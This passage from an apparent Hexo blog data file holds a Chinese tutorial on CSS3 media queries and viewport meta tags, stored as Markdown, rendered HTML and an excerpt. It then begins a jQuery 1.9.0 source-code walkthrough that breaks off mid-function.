移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。\n\n<!-- more -->\n\n## meta标签\n\n先介绍一下HTML的meta标签。`<meta>`可提供有关某个 HTML 元素的元信息 (meta-information)，比如描述、针对搜索引擎的关键词以及刷新频率。\n\n它有以下几个属性：\n\n|属性\t\t|描述\t|\n|-----------|-------|\n|content\t|设置或返回 <meta> 元素的 content 属性的值。|\n|httpEquiv\t|把 content 属性连接到一个 HTTP 头部。|\n|name\t\t|把 content 属性连接到某个名称。|\n|scheme\t\t|设置或返回用于解释 content 属性的值的格式。|\n\n而在响应式中我们常常这么设置(IE9及以上)：\n\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n\n参数说明：\n\n* width = device-width：宽度等于当前设备的宽度\n* initial-scale：初始的缩放比例（默认设置为1.0）  \n* minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）    \n* maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）   \n* user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面） \n\n还有这个：\n\n\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge，chrome=1\">\n\n这个主要是为了防止有的用户IE升级到IE9以上了而浏览器的文档模式却是IE8。最后的`chrome=1`代表`[Google Chrome Frame（谷歌内嵌浏览器框架GCF）](http://zh.wikipedia.org/wiki/Google_Chrome_Frame)`.如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。\n\n> IE8既不支持HTML5也不支持CSS3 Media,所以如果需要兼容，则需要引入一下两个js文件\n>\n>\t<!--[if lt IE 9]>\n\t  <script src=\"https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js\"></script>\n\t  <script src=\"https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js\"></script>\n\t<![endif]-->\n>\n> 顺便，复习一下[CSS条件注释](http://www.cnblogs.com/fm168/p/5526702.html)\n\n## CSS3 Media\n\n### 语法\n\n\t@media mediatype and|not|only (media feature) {\n\t    CSS-Code;\n\t}\n\n或者使用引用link\n\n\t<link rel=\"stylesheet\" media=\"mediatype and|not|only (media feature)\" href=\"mystylesheet.css\">\n\n其中`mediatype`主要有:\n\n* all: 用于所有设备\n* print:　用于打印机和打印预览\n* screen: 用于电脑屏幕，平板电脑，智能手机等。\n* speech: 用于屏幕阅读器等发声设备\n\n`media feature`主要有:\n\n|值\t|描述|\n|---|----|\n|aspect-ratio\t|定义输出设备中的页面可见区域宽度与高度的比率|\n|color\t|定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0|\n|color-index\t|定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0|\n|device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的比率。|\n|device-height\t|定义输出设备的屏幕可见高度。|\n|device-width\t|定义输出设备的屏幕可见宽度。|\n|grid\t|用来查询输出设备是否使用栅格或点阵。|\n|height\t|定义输出设备中的页面可见区域高度。|\n|max-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最大比率。|\n|max-color\t|定义输出设备每一组彩色原件的最大个数。|\n|max-color-index\t|定义在输出设备的彩色查询表中的最大条目数。|\n|max-device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最大比率。|\n|max-device-height\t|定义输出设备的屏幕可见的最大高度。|\n|max-device-width\t|定义输出设备的屏幕最大可见宽度。|\n|max-height\t|定义输出设备中的页面最大可见区域高度。|\n|max-monochrome\t|定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。|\n|max-resolution\t|定义设备的最大分辨率。|\n|max-width\t|定义输出设备中的页面最大可见区域宽度。|\n|min-aspect-ratio\t|定义输出设备中的页面可见区域宽度与高度的最小比率。|\n|min-color\t|定义输出设备每一组彩色原件的最小个数。|\n|min-color-index\t|定义在输出设备的彩色查询表中的最小条目数。|\n|min-device-aspect-ratio\t|定义输出设备的屏幕可见宽度与高度的最小比率。|\n|min-device-width\t|定义输出设备的屏幕最小可见宽度。|\n|min-device-height\t|定义输出设备的屏幕的最小可见高度。|\n|min-height\t|定义输出设备中的页面最小可见区域高度。|\n|min-monochrome\t|定义在一个单色框架缓冲区中每像素包含的最小单色原件个数|\n|min-resolution\t|定义设备的最小分辨率。|\n|min-width\t|定义输出设备中的页面最小可见区域宽度。|\n|monochrome\t|定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0|\n|orientation\t|定义输出设备中的页面可见区域高度是否大于或等于宽度。|\n|resolution\t|定义设备的分辨率。如：96dpi, 300dpi, 118dpcm|\n|scan\t|定义电视类设备的扫描工序。|\n|width\t|定义输出设备中的页面可见区域宽度。|\n\n### 举例\n\n\t@media screen and (max-width: 960px){\n\t    body{\n\t        background: #000;\n\t    }\n\t}\n\n上面这段CSS代码意思是：当页面小于960px的时候执行这一段CSS。\n\n也可以省略screen(不考虑用户打印等其他需求)，直接\n\n\t@media (max-width: 960px){\n\t    body{\n\t        background: #000;\n\t    }\n\t}\n\n再比如：\n\n\t@media screen and (max-device-width:960px){\n\t    body{\n\t        background:red;\n\t    }\n\t}\n\n实现等于960px尺寸的代码\n\n或者混合：\n\n\t@media screen and (min-width:960px) and (max-width:1200px){\n\t    body{\n\t        background:yellow;\n\t    }\n\t}\n\n****\n\n参考链接\n\n* [HTML DOM Meta 对象](http://www.runoob.com/jsref/dom-obj-meta.html)\n* [css3 media媒体查询器用法总结--来自520UED](http://www.520ued.com/article/53882d7ab992a7c43f5c204b)","slug":"CSS3媒体查询","published":1,"date":"2017-04-09T04:07:12.789Z","updated":"2017-04-09T04:09:46.981Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3e0001l8sldmf4648j","content":"<blockquote>\n<p>移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"meta标签\"><a href=\"#meta标签\" class=\"headerlink\" title=\"meta标签\"></a>meta标签</h2><p>先介绍一下HTML的meta标签。<code>&lt;meta&gt;</code>可提供有关某个 HTML 元素的元信息 (meta-information)，比如描述、针对搜索引擎的关键词以及刷新频率。</p>\n<p>它有以下几个属性：</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>content</td>\n<td>设置或返回 <meta> 元素的 content 属性的值。</td>\n</tr>\n<tr>\n<td>httpEquiv</td>\n<td>把 content 属性连接到一个 HTTP 头部。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>把 content 属性连接到某个名称。</td>\n</tr>\n<tr>\n<td>scheme</td>\n<td>设置或返回用于解释 content 属性的值的格式。</td>\n</tr>\n</tbody>\n</table>\n<p>而在响应式中我们常常这么设置(IE9及以上)：</p>\n<pre><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;\n</code></pre><p>参数说明：</p>\n<ul>\n<li>width = device-width：宽度等于当前设备的宽度</li>\n<li>initial-scale：初始的缩放比例（默认设置为1.0）  </li>\n<li>minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）    </li>\n<li>maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）   </li>\n<li>user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面） </li>\n</ul>\n<p>还有这个：</p>\n<pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge，chrome=1&quot;&gt;\n</code></pre><p>这个主要是为了防止有的用户IE升级到IE9以上了而浏览器的文档模式却是IE8。最后的<code>chrome=1</code>代表<code>[Google Chrome Frame（谷歌内嵌浏览器框架GCF）](http://zh.wikipedia.org/wiki/Google_Chrome_Frame)</code>.如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。</p>\n<blockquote>\n<p>IE8既不支持HTML5也不支持CSS3 Media,所以如果需要兼容，则需要引入一下两个js文件</p>\n   <!--[if lt IE 9]>\n      <script src=\"https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js\"></script>\n      <script src=\"https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js\"></script>\n    <![endif]-->\n<p>顺便，复习一下<a href=\"http://www.cnblogs.com/fm168/p/5526702.html\" target=\"_blank\" rel=\"external\">CSS条件注释</a></p>\n</blockquote>\n<h2 id=\"CSS3-Media\"><a href=\"#CSS3-Media\" class=\"headerlink\" title=\"CSS3 Media\"></a>CSS3 Media</h2><h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><pre><code>@media mediatype and|not|only (media feature) {\n    CSS-Code;\n}\n</code></pre><p>或者使用引用link</p>\n<pre><code>&lt;link rel=&quot;stylesheet&quot; media=&quot;mediatype and|not|only (media feature)&quot; href=&quot;mystylesheet.css&quot;&gt;\n</code></pre><p>其中<code>mediatype</code>主要有:</p>\n<ul>\n<li>all: 用于所有设备</li>\n<li>print:　用于打印机和打印预览</li>\n<li>screen: 用于电脑屏幕，平板电脑，智能手机等。</li>\n<li>speech: 用于屏幕阅读器等发声设备</li>\n</ul>\n<p><code>media feature</code>主要有:</p>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的比率</td>\n</tr>\n<tr>\n<td>color</td>\n<td>定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0</td>\n</tr>\n<tr>\n<td>color-index</td>\n<td>定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0</td>\n</tr>\n<tr>\n<td>device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的比率。</td>\n</tr>\n<tr>\n<td>device-height</td>\n<td>定义输出设备的屏幕可见高度。</td>\n</tr>\n<tr>\n<td>device-width</td>\n<td>定义输出设备的屏幕可见宽度。</td>\n</tr>\n<tr>\n<td>grid</td>\n<td>用来查询输出设备是否使用栅格或点阵。</td>\n</tr>\n<tr>\n<td>height</td>\n<td>定义输出设备中的页面可见区域高度。</td>\n</tr>\n<tr>\n<td>max-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-color</td>\n<td>定义输出设备每一组彩色原件的最大个数。</td>\n</tr>\n<tr>\n<td>max-color-index</td>\n<td>定义在输出设备的彩色查询表中的最大条目数。</td>\n</tr>\n<tr>\n<td>max-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-device-height</td>\n<td>定义输出设备的屏幕可见的最大高度。</td>\n</tr>\n<tr>\n<td>max-device-width</td>\n<td>定义输出设备的屏幕最大可见宽度。</td>\n</tr>\n<tr>\n<td>max-height</td>\n<td>定义输出设备中的页面最大可见区域高度。</td>\n</tr>\n<tr>\n<td>max-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。</td>\n</tr>\n<tr>\n<td>max-resolution</td>\n<td>定义设备的最大分辨率。</td>\n</tr>\n<tr>\n<td>max-width</td>\n<td>定义输出设备中的页面最大可见区域宽度。</td>\n</tr>\n<tr>\n<td>min-aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-color</td>\n<td>定义输出设备每一组彩色原件的最小个数。</td>\n</tr>\n<tr>\n<td>min-color-index</td>\n<td>定义在输出设备的彩色查询表中的最小条目数。</td>\n</tr>\n<tr>\n<td>min-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-device-width</td>\n<td>定义输出设备的屏幕最小可见宽度。</td>\n</tr>\n<tr>\n<td>min-device-height</td>\n<td>定义输出设备的屏幕的最小可见高度。</td>\n</tr>\n<tr>\n<td>min-height</td>\n<td>定义输出设备中的页面最小可见区域高度。</td>\n</tr>\n<tr>\n<td>min-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最小单色原件个数</td>\n</tr>\n<tr>\n<td>min-resolution</td>\n<td>定义设备的最小分辨率。</td>\n</tr>\n<tr>\n<td>min-width</td>\n<td>定义输出设备中的页面最小可见区域宽度。</td>\n</tr>\n<tr>\n<td>monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0</td>\n</tr>\n<tr>\n<td>orientation</td>\n<td>定义输出设备中的页面可见区域高度是否大于或等于宽度。</td>\n</tr>\n<tr>\n<td>resolution</td>\n<td>定义设备的分辨率。如：96dpi, 300dpi, 118dpcm</td>\n</tr>\n<tr>\n<td>scan</td>\n<td>定义电视类设备的扫描工序。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>定义输出设备中的页面可见区域宽度。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h3><pre><code>@media screen and (max-width: 960px){\n    body{\n        background: #000;\n    }\n}\n</code></pre><p>上面这段CSS代码意思是：当页面小于960px的时候执行这一段CSS。</p>\n<p>也可以省略screen(不考虑用户打印等其他需求)，直接</p>\n<pre><code>@media (max-width: 960px){\n    body{\n        background: #000;\n    }\n}\n</code></pre><p>再比如：</p>\n<pre><code>@media screen and (max-device-width:960px){\n    body{\n        background:red;\n    }\n}\n</code></pre><p>实现等于960px尺寸的代码</p>\n<p>或者混合：</p>\n<pre><code>@media screen and (min-width:960px) and (max-width:1200px){\n    body{\n        background:yellow;\n    }\n}\n</code></pre><hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://www.runoob.com/jsref/dom-obj-meta.html\" target=\"_blank\" rel=\"external\">HTML DOM Meta 对象</a></li>\n<li><a href=\"http://www.520ued.com/article/53882d7ab992a7c43f5c204b\" target=\"_blank\" rel=\"external\">css3 media媒体查询器用法总结–来自520UED</a></li>\n</ul>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<blockquote>\n<p>移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。</p>\n</blockquote>","more":"<h2 id=\"meta标签\"><a href=\"#meta标签\" class=\"headerlink\" title=\"meta标签\"></a>meta标签</h2><p>先介绍一下HTML的meta标签。<code>&lt;meta&gt;</code>可提供有关某个 HTML 元素的元信息 (meta-information)，比如描述、针对搜索引擎的关键词以及刷新频率。</p>\n<p>它有以下几个属性：</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>content</td>\n<td>设置或返回 <meta> 元素的 content 属性的值。</td>\n</tr>\n<tr>\n<td>httpEquiv</td>\n<td>把 content 属性连接到一个 HTTP 头部。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>把 content 属性连接到某个名称。</td>\n</tr>\n<tr>\n<td>scheme</td>\n<td>设置或返回用于解释 content 属性的值的格式。</td>\n</tr>\n</tbody>\n</table>\n<p>而在响应式中我们常常这么设置(IE9及以上)：</p>\n<pre><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;\n</code></pre><p>参数说明：</p>\n<ul>\n<li>width = device-width：宽度等于当前设备的宽度</li>\n<li>initial-scale：初始的缩放比例（默认设置为1.0）  </li>\n<li>minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）    </li>\n<li>maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）   </li>\n<li>user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面） </li>\n</ul>\n<p>还有这个：</p>\n<pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge，chrome=1&quot;&gt;\n</code></pre><p>这个主要是为了防止有的用户IE升级到IE9以上了而浏览器的文档模式却是IE8。最后的<code>chrome=1</code>代表<code>[Google Chrome Frame（谷歌内嵌浏览器框架GCF）](http://zh.wikipedia.org/wiki/Google_Chrome_Frame)</code>.如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。</p>\n<blockquote>\n<p>IE8既不支持HTML5也不支持CSS3 Media,所以如果需要兼容，则需要引入一下两个js文件</p>\n   <!--[if lt IE 9]>\n      <script src=\"https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js\"></script>\n      <script src=\"https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js\"></script>\n    <![endif]-->\n<p>顺便，复习一下<a href=\"http://www.cnblogs.com/fm168/p/5526702.html\">CSS条件注释</a></p>\n</blockquote>\n<h2 id=\"CSS3-Media\"><a href=\"#CSS3-Media\" class=\"headerlink\" title=\"CSS3 Media\"></a>CSS3 Media</h2><h3 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h3><pre><code>@media mediatype and|not|only (media feature) {\n    CSS-Code;\n}\n</code></pre><p>或者使用引用link</p>\n<pre><code>&lt;link rel=&quot;stylesheet&quot; media=&quot;mediatype and|not|only (media feature)&quot; href=&quot;mystylesheet.css&quot;&gt;\n</code></pre><p>其中<code>mediatype</code>主要有:</p>\n<ul>\n<li>all: 用于所有设备</li>\n<li>print:　用于打印机和打印预览</li>\n<li>screen: 用于电脑屏幕，平板电脑，智能手机等。</li>\n<li>speech: 用于屏幕阅读器等发声设备</li>\n</ul>\n<p><code>media feature</code>主要有:</p>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的比率</td>\n</tr>\n<tr>\n<td>color</td>\n<td>定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0</td>\n</tr>\n<tr>\n<td>color-index</td>\n<td>定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0</td>\n</tr>\n<tr>\n<td>device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的比率。</td>\n</tr>\n<tr>\n<td>device-height</td>\n<td>定义输出设备的屏幕可见高度。</td>\n</tr>\n<tr>\n<td>device-width</td>\n<td>定义输出设备的屏幕可见宽度。</td>\n</tr>\n<tr>\n<td>grid</td>\n<td>用来查询输出设备是否使用栅格或点阵。</td>\n</tr>\n<tr>\n<td>height</td>\n<td>定义输出设备中的页面可见区域高度。</td>\n</tr>\n<tr>\n<td>max-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-color</td>\n<td>定义输出设备每一组彩色原件的最大个数。</td>\n</tr>\n<tr>\n<td>max-color-index</td>\n<td>定义在输出设备的彩色查询表中的最大条目数。</td>\n</tr>\n<tr>\n<td>max-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-device-height</td>\n<td>定义输出设备的屏幕可见的最大高度。</td>\n</tr>\n<tr>\n<td>max-device-width</td>\n<td>定义输出设备的屏幕最大可见宽度。</td>\n</tr>\n<tr>\n<td>max-height</td>\n<td>定义输出设备中的页面最大可见区域高度。</td>\n</tr>\n<tr>\n<td>max-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。</td>\n</tr>\n<tr>\n<td>max-resolution</td>\n<td>定义设备的最大分辨率。</td>\n</tr>\n<tr>\n<td>max-width</td>\n<td>定义输出设备中的页面最大可见区域宽度。</td>\n</tr>\n<tr>\n<td>min-aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-color</td>\n<td>定义输出设备每一组彩色原件的最小个数。</td>\n</tr>\n<tr>\n<td>min-color-index</td>\n<td>定义在输出设备的彩色查询表中的最小条目数。</td>\n</tr>\n<tr>\n<td>min-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-device-width</td>\n<td>定义输出设备的屏幕最小可见宽度。</td>\n</tr>\n<tr>\n<td>min-device-height</td>\n<td>定义输出设备的屏幕的最小可见高度。</td>\n</tr>\n<tr>\n<td>min-height</td>\n<td>定义输出设备中的页面最小可见区域高度。</td>\n</tr>\n<tr>\n<td>min-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最小单色原件个数</td>\n</tr>\n<tr>\n<td>min-resolution</td>\n<td>定义设备的最小分辨率。</td>\n</tr>\n<tr>\n<td>min-width</td>\n<td>定义输出设备中的页面最小可见区域宽度。</td>\n</tr>\n<tr>\n<td>monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0</td>\n</tr>\n<tr>\n<td>orientation</td>\n<td>定义输出设备中的页面可见区域高度是否大于或等于宽度。</td>\n</tr>\n<tr>\n<td>resolution</td>\n<td>定义设备的分辨率。如：96dpi, 300dpi, 118dpcm</td>\n</tr>\n<tr>\n<td>scan</td>\n<td>定义电视类设备的扫描工序。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>定义输出设备中的页面可见区域宽度。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h3><pre><code>@media screen and (max-width: 960px){\n    body{\n        background: #000;\n    }\n}\n</code></pre><p>上面这段CSS代码意思是：当页面小于960px的时候执行这一段CSS。</p>\n<p>也可以省略screen(不考虑用户打印等其他需求)，直接</p>\n<pre><code>@media (max-width: 960px){\n    body{\n        background: #000;\n    }\n}\n</code></pre><p>再比如：</p>\n<pre><code>@media screen and (max-device-width:960px){\n    body{\n        background:red;\n    }\n}\n</code></pre><p>实现等于960px尺寸的代码</p>\n<p>或者混合：</p>\n<pre><code>@media screen and (min-width:960px) and (max-width:1200px){\n    body{\n        background:yellow;\n    }\n}\n</code></pre><hr>\n<p>参考链接</p>\n<ul>\n<li><a href=\"http://www.runoob.com/jsref/dom-obj-meta.html\">HTML DOM Meta 对象</a></li>\n<li><a href=\"http://www.520ued.com/article/53882d7ab992a7c43f5c204b\">css3 media媒体查询器用法总结–来自520UED</a></li>\n</ul>"},{"title":"jQuery源码剖析·第一弹","_content":"\n> 神库jQuery的内心世界\n\n> 选用1.9.0版本jQuery\n\n<!-- more -->\n\n## 目录\n\n1. **沙箱封装**\n2. **core工具方法**：jquery的核心组成部分，包括\n\t* $.trim()去除字符串两端的空格。（内部调用7次）\n\t* $.each()遍历数组或对象（内部调用59次）\n\t* $.inArray()返回一个值在数组中的索引位置。如果该值不在数组中，则返回-1。（内部调用9次）\n\t* $.grep()返回数组中符合某种标准的元素。（内部调用6次）\n\t* $.merge()合并两个数组。（内部调用11次）\n\t* $.map()将一个数组中的元素转换到另一个数组中。（内部调用12次）\n\t* $.makeArray()将对象转化为数组。（内部调用6次）\n\t* $.globalEval() 在全局作用域下执行一段js脚本。（内部调用2次）\n\t* $.proxy()接受一个函数，然后返回一个新函数，并且这个新函数始终保持了特定的上下文(context)语境。（内部调用0次）\n\t* $.nodeName()返回DOM节点的节点名字，或者判断DOM节点名是否为某某名字。（内部调用51次）\n\t* $.extend()将多个对象，合并到第一个对象。（内部调用42次）\n3. **$.type类型判断**：判断对象的类别（函数对象、日期对象、数组对象、正则对象等等（内部调用65次）,并以调用此方法来实现：\n\t* $.isArray()判断某个参数是否为数组。（内部调用12次）\n\t* $.isEmptyObject()判断某个对象是否为空（不含有任何属性）。（内部调用4次）\n\t* $.isFunction()判断某个参数是否为函数。（内部调用32次）\n\t* $.isPlainObject()判断某个参数是否为用\"{}\"或\"new Object\"建立的对象。（内部调用4次）\n\t* $.isWindow()判断是否为window对象。（内部调用6次）\n4. **处理ajax返回数据**：主要包括\n\t* $.parseHTML() 解析HTML（内部调用2次）\n\t* $.parseJSON() 解析JSON（内部调用2次）\n\t* $.parseXML() 解析XML（内部调用1次）\n5. **几个简单的函数**：不在之后的文章中分析\n\t* $.noop() 一个空函数，个人觉得是用来作为一个默认的回调函数，无需每次去定义一个空的function消耗资源。（内部调用2次）\n\t* $.now() 获取当前时间戳，代码很简单：return (new Date()).getTime();。（内部调用4次）\n\t* $.error() 报错，对外抛出一个异常，代码很简单：throw new Error(msg);。（内部调用2次）\n\n## 沙箱封装\n\n\t(function( window, undefined ) {\n\t     //用一个函数域把整个库包起来，就是所谓的沙箱\n\t     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局\n\t     //把当前沙箱需要的外部变量通过函数参数引入进来\n\t     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数\n\t    \"use strict\";\n\t    window.jQuery = window.$ = jQuery;\n\t})( window );\n\n至于为什么第二个参数`undefined`，这是一个针对压缩的小trick，同时也是为了防止因ES5之前能对`undefined`赋值而使用者编程不规范引发错误。\n\n压缩前\n\n\t(function( window, undefined ) {\n\t  var a = undefined;\n\t  if (a == undefined){......}\n\n\t  ......\n\t  if (c == undefined) return;\n\t})( window );\n\n压缩后\n\n\t(function(w, u) {\n\t  var a = u;\n\t  if (a == u){......}\n\n\t  ......\n\t  if (c == u) return;\n\t})(w);\n\n内部全局的`undefined`被缩成一个`u`，缩小了整个库的压缩包的体积。\n\n## core工具方法\n\n### 引用类型公有方法的存储\n\n#### 源码：\n\n\tclass2type = {},\n\tcore_deletedIds = [],\n\tcore_version = \"1.9.0\",\n\n\t// Save a reference to some core methods\n\tcore_concat = core_deletedIds.concat,\n\tcore_push = core_deletedIds.push,\n\tcore_slice = core_deletedIds.slice,\n\tcore_indexOf = core_deletedIds.indexOf,\n\tcore_toString = class2type.toString,\n\tcore_hasOwn = class2type.hasOwnProperty,\n\tcore_trim = core_version.trim,\n\n#### 等同于：\n\n\tcore_concat = Array.prototype.concat, \n\t......\n\n#### 分析：\n\n这里把js的几个引用类型的原生方法存储下来。本身这些方法的调用方式就有这3种：\n\n\tvar arr = [];\n\n\t1. arr.concat();\n\t2. core_concat.call(arr);\n\t3. core_concat.apply(arr);\n\n这里就有两个问题\n\n1. jQuery为什么要先把这些方法存储起来？\n2. jQuery为什么要采用方式二或者三，而不直接使用方式一的做法？ \n\n其实第二个问题就回答了第一个问题。\n而关于第二个问题有两个回答：\n\n1. 按第一种方式调用时，首先需要辨别当前实例`arr`的类型是`Array`，在内存空间中寻找`Array`的`concat`内存入口，把当前对象`arr`的指针和其他参数压入栈，跳转到`concat`地址开始执行。而当保存了`concat`方法的入口`core_concat`时，完全就可以省去前面两个步骤，从而提升一些性能。\n2. `var obj = {};`此时调用`obj.concat`会报错。但是如果采用后两种方式调用的话，能够解决这个问题。 也即是让类数组也能用到数组的方法（这就是`call`跟`apply`带来的另一种用法），尤其在jQuery里边引用一些DOM对象时，也能完美的用这个方法去解决。\n\n### $.trim()\n\n#### 源码：\n\n\tcore_version = \"1.9.0\",\n\tcore_trim = core_version.trim,\n\trtrim = /^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,\n\n\ttrim: core_trim && !core_trim.call(\"\\uFEFF\\xA0\") ?\n\t  function( text ) {\n\t    return text == null ?\n\t      \"\" :\n\t      core_trim.call( text );\n\t  } :\n\n\t  // Otherwise use our own trimming functionality\n\t  function( text ) {\n\t    return text == null ?\n\t      \"\" :\n\t      ( text + \"\" ).replace( rtrim, \"\" );\n\t  }\n\n#### 等同于：\n\n\t trim: if (String.prototype.trim && \"\\uFEFF\\xA0\".trim() !== \"\") {\n\t \t//直接调用原生String的trim方法\n\t } else {\n\t \t//使用正则表达式和replace方法替换前尾的空格\n\t }\n\n#### 分析：\n\n如果浏览器原生支持`String`的`trim`方法，并且能够解析全角空格，那么就直接使用原生的`trim`方法\n\n> `\\uFEFF`是utf8的字节序标记，`\\xA0`是全角空格\n\n如果以上条件成立，那就直接用原生的trim函数:\n\n\t$.trim = function( text ) {\n\t    return text == null ?\n\t        \"\" :\n\t        text.trim();\n\t}\n\n如果上述条件不成立，那就自己实现一个`trim`方法：\n\n\t$.trim = function( text ) {\n\t    return text == null ?\n\t        \"\" :\n\t        ( text + \"\" ).replace( rtrim, \"\" );\n\t}\n\n### $.each()\n\n#### 源码：\n\n\t$.each = function( obj, callback, args ) {\n\t  //obj 是需要遍历的数组或者对象\n\t  //callback是处理数组或对象的每个元素的回调函数，它的返回值实际会中断循环的过程\n\n\t  var value,\n\t    i = 0,\n\t    length = obj.length,\n\t    //判断是不是数组\n\t    isArray = isArraylike( obj );\n\n\t  if ( args ) {\n\t    if ( isArray ) {\n\t      for ( ; i < length; i++ ) {\n\t        value = callback.apply( obj[ i ], args );\n\t        //相当于: args = [arg1, arg2, arg3];\n\t        //callback(args1, args2, args3)。然后callback里边的this指向了obj[i]\n\n\t        if ( value === false ) {\n\t          